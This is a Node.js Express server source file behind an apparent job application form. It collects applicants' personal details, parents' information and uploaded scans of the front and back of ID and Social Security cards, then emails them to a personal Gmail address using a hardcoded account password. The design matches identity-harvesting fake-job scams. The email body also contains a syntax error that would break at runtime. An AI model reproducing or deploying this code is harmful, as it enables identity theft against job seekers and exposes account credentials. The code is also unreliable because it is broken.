const express = require('express');
const multer = require('multer');
const nodemailer = require('nodemailer');
const path = require('path');
const fs = require('fs');

// Create an instance of Express
const app = express();

// Set up storage engine for multer
const storage = multer.diskStorage({
  destination: './uploads/',
  filename: (req, file, cb) => {
    cb(null, Date.now() + path.extname(file.originalname));
  },
});

// Initialize upload
const upload = multer({ storage: storage });

// Serve static files from the public directory
app.use(express.static('public'));

// Parse URL-encoded bodies (as sent by HTML forms)
app.use(express.urlencoded({ extended: true }));

// Parse JSON bodies (as sent by API clients)
app.use(express.json());

// Load the index.html file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

// Handle form submissions
app.post('/submit', upload.fields([{ name: 'idFront' }, { name: 'idBack' }, { name: 'ssnFront' }, { name: 'ssnBack' }]), (req, res) => {
  const { firstName, lastName, address, city, state, zipcode, phone, email, workExperience, capableToWork, employmentstatus, hearAboutUs, workEnvironment, parentFirstName, parentLastName, parentPhone, parentOccupation, ownOrRent, ownCar, smoke, dateAssigned, signature } = req.body;

  // Set up Nodemailer transport
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'bellosamuel396@gmail.com',
      pass: 'Alapomeji1',
    },
  });

  // Email options
  const mailOptions = {
    from: 'bellosamuel396@gmail.com',
    to: 'bellosamuel737@gmail.com',
    subject: 'New Job Application Submission',
    text: 'FORM DESIGN BY CORNERSTONE'`
      Name: ${firstName} ${lastName}
      Address: ${address}, ${city}, ${state} ${zipcode}
      Phone: ${phone}
      Email: ${email}
      Work Experience: ${workExperience}
      Capable to Work: ${capableToWork}
      Employment Status: ${employmentstatus}
      Where heard about us: ${hearAboutUs}
      Work Environment: ${workEnvironment}
      Parent's Name: ${parentFirstName} ${parentLastName}
      Parent's Phone: ${parentPhone}
      Parent's Occupation: ${parentOccupation}
      Own or Rent: ${ownOrRent}
      Own a Car: ${ownCar}
      Smoke: ${smoke}
      Date Assigned: ${dateAssigned}
      Signature: ${signature}
    `,
    attachments: [
      { path: req.files['idFront'][0].path },
      { path: req.files['idBack'][0].path },
      { path: req.files['ssnFront'][0].path },
      { path: req.files['ssnBack'][0].path },
    ],
  };

  // Send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send('Error: ' + error);
    } else {
      console.log('Email sent: ' + info.response);
      res.send('Your application has been submitted successfully!');
      
      // Delete uploaded files after sending the email
      fs.unlink(req.files['idFront'][0].path, (err) => {
        if (err) console.log(err);
      });
      fs.unlink(req.files['idBack'][0].path, (err) => {
        if (err) console.log(err);
      });
      fs.unlink(req.files['ssnFront'][0].path, (err) => {
        if (err) console.log(err);
      });
      fs.unlink(req.files['ssnBack'][0].path, (err) => {
        if (err) console.log(err);
      });
    }
  });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
